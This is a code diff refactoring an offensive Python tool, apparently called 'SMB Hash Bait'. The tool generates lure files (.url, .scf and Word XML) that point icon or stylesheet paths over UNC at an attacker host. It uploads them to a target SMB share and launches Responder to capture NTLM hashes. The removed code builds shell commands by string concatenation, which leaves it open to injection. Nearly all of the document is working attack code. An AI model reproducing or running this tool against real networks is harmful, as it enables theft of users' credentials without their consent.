@@ -6,10 +6,10 @@ NTLM authentication, then hands off to Responder for capture.
 """
 
 import argparse
-import os
 import shutil
+import subprocess
 import sys
-import time
+from pathlib import Path
 
 import colorama
 
@@ -52,6 +52,81 @@ def _banner():
     print(SKY      + "        ~ SMB Hash Bait ~     " + RESET)
 
 
+def make_url(lhost, basename="@lure"):
+    """Write an Internet shortcut payload that resolves an icon over UNC."""
+    path = Path(f"{basename}.url")
+    path.write_text(
+        "[InternetShortcut]\n"
+        "URL=whatever\n"
+        "WorkingDirectory=whatever\n"
+        f"IconFile=\\\\{lhost}\\%USERNAME%.icon\n"
+        "IconIndex=1\n"
+    )
+    print(GREEN + f"[+] Wrote {path}" + RESET)
+    return path
+
+
+def make_scf(lhost, basename="@lure"):
+    """Write a shell command link payload that resolves an icon over UNC."""
+    path = Path(f"{basename}.scf")
+    path.write_text(
+        "[Shell]\n"
+        "Command=2\n"
+        f"IconFile=\\\\{lhost}\\tools\\nc.ico\n"
+        "[Taskbar]\n"
+        "Command=ToggleDesktop\n"
+    )
+    print(GREEN + f"[+] Wrote {path}" + RESET)
+    return path
+
+
+def make_xml(lhost, basename="@lure"):
+    """Write a Word document payload pointing at a remote XSL over UNC."""
+    path = Path(f"{basename}.xml")
+    path.write_text(
+        "<?xml version='1.0' encoding='UTF-8' standalone='yes'?>\n"
+        "<?mso-application progid='Word.Document'?>\n"
+        f"<?xml-stylesheet type='text/xsl' href='\\\\{lhost}\\lure.xsl' ?>\n"
+    )
+    print(GREEN + f"[+] Wrote {path}" + RESET)
+    return path
+
+
+def smb_put(host, share, payloads, *, sub_dir=None,
+            user=None, password=None, domain=None):
+    """Upload payload files to an SMB share via smbclient.
+
+    Builds an argv list and invokes smbclient without a shell, so
+    user-supplied values (host, share, sub_dir, credentials) cannot be
+    interpreted as shell metacharacters.
+    """
+    cmd = ["smbclient", f"//{host}/{share}"]
+    if user is not None and password is not None:
+        principal = f"{domain}/{user}" if domain else user
+        cmd.extend(["-U", principal, "--password", password])
+    else:
+        cmd.append("-N")  # anonymous
+
+    # smbclient -c takes a script in smbclient's own command grammar
+    # (";" separates commands). Filenames are double-quoted for paths
+    # that may contain spaces.
+    script_parts = []
+    if sub_dir:
+        script_parts.append(f'cd "{sub_dir}"')
+    script_parts.extend(f'put "{p}"' for p in payloads)
+    cmd.extend(["-c", "; ".join(script_parts)])
+
+    target = f"//{host}/{share}" + (f"/{sub_dir}" if sub_dir else "")
+    print(BLUE + f"[*] Uploading {len(payloads)} payload(s) to {target}" + RESET)
+    return subprocess.run(cmd).returncode
+
+
+def run_responder(interface):
+    """Hand off to Responder on the given interface."""
+    print(BLUE + f"[*] Starting Responder on {interface}" + RESET)
+    return subprocess.run(["sudo", "responder", "-I", interface, "-wv"]).returncode
+
+
 def main():
     colorama.just_fix_windows_console()
     _banner()
@@ -81,115 +156,44 @@ def main():
 
     args = parser.parse_args()
 
-    RHOST = args.RHOST
-    LHOST = args.LHOST
-    DOMAIN = args.DOMAIN
-    INTERFACE = args.Interface
-    SHARE = args.Share
-    USERNAME = args.Username
-    PASSWORD = args.Password
-    OTHER = args.Other
-
     if not (args.scf or args.url or args.xml or args.All):
         print(YELLOW + "What do you want from me!!!" + RESET)
         parser.print_help()
-        sys.exit()
+        sys.exit(2)
 
-    if USERNAME is not None and PASSWORD is None:
+    if args.Username is not None and args.Password is None:
         print(RED + "Need password if utilizing a username" + RESET)
+        sys.exit(2)
 
     _check_prereqs()
 
-    def url():
-        print(YELLOW + "Making @lure.url \n" + RESET)
-        f = open("@lure.url", "w")
-        template = f"""[InternetShortcut]\n
-URL=whatever\n
-WorkingDirectory=whatever\n
-IconFile=\\\\""" + LHOST + """\\%USERNAME%.icon\n
-IconIndex=1"""
-        f.write(template)
-        time.sleep(1)
-        print(GREEN + "Putting file into smb server, responder will automatically start \n" + RESET)
+    # Resolve which payloads to generate (explicit flags or --All).
+    want_url = args.url or args.All
+    want_scf = args.scf or args.All
+    want_xml = args.xml or args.All
 
-    def scf():
-        print(YELLOW + "Making @lure.scf \n" + RESET)
-        f = open("@lure.scf", "w")
-        template = f"""[Shell]\n
-Command=2\n
-IconFile=\\\\""" + LHOST + """\\tools\\nc.ico\n
-[Taskbar]\n
-Command=ToggleDesktop"""
-        f.write(template)
-        print(GREEN + "Putting file into smb server and starting Responder \n " + RESET)
+    payloads = []
+    if want_url:
+        payloads.append(make_url(args.LHOST))
+    if want_scf:
+        payloads.append(make_scf(args.LHOST))
+    if want_xml:
+        payloads.append(make_xml(args.LHOST))
 
-    def xml():
-        print(YELLOW + "Making @lure.xml \n" + RESET)
-        f = open("@lure.xml", "w")
-        template = f"""("<?xml version='1.0' encoding='UTF-8' standalone='yes'?>\n"
-"<?mso-application progid='Word.Document'?>\n"
-"<?xml-stylesheet type='text/xsl' href='\\\\""" + LHOST + """\\lure.xsl' ?>")"""
-        f.write(template)
-        print(GREEN + "Putting file into smb server, once done exit out of SMB Server and responder will automatically start \n" + RESET)
+    rc = smb_put(
+        args.RHOST,
+        args.Share,
+        payloads,
+        sub_dir=args.Other,
+        user=args.Username,
+        password=args.Password,
+        domain=args.DOMAIN,
+    )
+    if rc != 0:
+        print(RED + f"[-] smbclient exited with code {rc}" + RESET)
+        sys.exit(rc)
 
-    def URL_File():
-        if USERNAME is not None and PASSWORD is not None:
-            os.system("""smbclient //""" + RHOST + """/""" + SHARE + """ -U """ + DOMAIN + """/""" + USERNAME + """%""" + PASSWORD + """ -c 'put @lure.url'""")
-            os.system("""sudo responder -I """ + INTERFACE + """ -wv""")
-        if OTHER is not None:
-            os.system("""smbclient //""" + RHOST + """/""" + SHARE + """ -c '; cd '""" + OTHER + """' ; put @lure.url'""")
-            os.system("""sudo responder -I """ + INTERFACE + """ -wv""")
-        if OTHER is None:
-            os.system("""smbclient //""" + RHOST + """/""" + SHARE + """ -c 'put @lure.url'""")
-            os.system("""sudo responder -I """ + INTERFACE + """ -wv""")
-
-    def SCF_File():
-        if USERNAME is not None and PASSWORD is not None:
-            os.system("""smbclient //""" + RHOST + """/""" + SHARE + """ -U """ + DOMAIN + """/""" + USERNAME + """%""" + PASSWORD + """ -c 'put @lure.scf'""")
-            os.system("""sudo responder -I """ + INTERFACE + """ -wv""")
-        if OTHER is not None:
-            os.system("""smbclient //""" + RHOST + """/""" + SHARE + """ -c '; cd '""" + OTHER + """' ; put @lure.scf'""")
-            os.system("""sudo responder -I """ + INTERFACE + """ -wv""")
-        if OTHER is None:
-            os.system("""smbclient //""" + RHOST + """/""" + SHARE + """ -c 'put @lure.scf'""")
-            os.system("""sudo responder -I """ + INTERFACE + """ -wv""")
-
-    def XML_File():
-        if USERNAME is not None and PASSWORD is not None:
-            os.system("""smbclient //""" + RHOST + """/""" + SHARE + """ -U """ + DOMAIN + """/""" + USERNAME + """%""" + PASSWORD + """ -c 'put @lure.xml'""")
-            os.system("""sudo responder -I """ + INTERFACE + """ -wv""")
-        if OTHER is not None:
-            os.system("""smbclient //""" + RHOST + """/""" + SHARE + """ -c '; cd '""" + OTHER + """' ; put @lure.xml'""")
-            os.system("""sudo responder -I """ + INTERFACE + """ -wv""")
-        if OTHER is None:
-            os.system("""smbclient //""" + RHOST + """/""" + SHARE + """ -c 'put @lure.xml'""")
-            os.system("""sudo responder -I """ + INTERFACE + """ -wv""")
-
-    def ALL():
-        if USERNAME is not None and PASSWORD is not None:
-            os.system("""smbclient //""" + RHOST + """/""" + SHARE + """ -U """ + DOMAIN + """/""" + USERNAME + """%""" + PASSWORD + """ -c 'put @lure.xml; put @lure.scf; put @lure.url'""")
-            os.system("""sudo responder -I """ + INTERFACE + """ -wv""")
-        if OTHER is not None:
-            os.system("""smbclient //""" + RHOST + """/""" + SHARE + """ -c '; cd '""" + OTHER + """' ; put @lure.xml; put @lure.url; put @lure.scf'""")
-            os.system("""sudo responder -I """ + INTERFACE + """ -wv""")
-        if OTHER is None:
-            os.system("""smbclient //""" + RHOST + """/""" + SHARE + """ -c 'put @lure.xml; put @lure.url; put @lure.scf'""")
-            os.system("""sudo responder -I """ + INTERFACE + """ -wv""")
-
-    if args.url:
-        url()
-        URL_File()
-    if args.scf:
-        scf()
-        SCF_File()
-    if args.xml:
-        xml()
-        XML_File()
-    if args.All:
-        xml()
-        url()
-        scf()
-        ALL()
+    run_responder(args.Interface)
 
 
 if __name__ == "__main__":
